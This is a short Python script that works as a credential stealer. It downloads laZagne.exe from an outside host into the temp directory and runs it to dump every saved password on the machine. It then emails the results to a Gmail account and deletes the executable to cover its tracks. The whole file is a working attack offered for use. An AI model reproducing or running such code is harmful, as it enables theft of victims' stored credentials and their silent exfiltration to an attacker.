import requests , subprocess , smtplib , re , os , tempfile
 
def download(url):
    get_request = requests.get(url)
    file_name = url.split("/")[-1]
    with open( file_name , "wb") as output_file :
        output_file.write(get_request.content) 

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()
   
temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)          
download("http://test.com/evil-files/laZagne.exe") 
command = "laZagne.exe all"
result = subprocess.check_output(command, shell=True)
send_mail("EMAIL", "APP PASS FOR EMAIL", result)
os.remove("laZagne.exe")  
#This script will send an email to the specified email address with the results of the command.
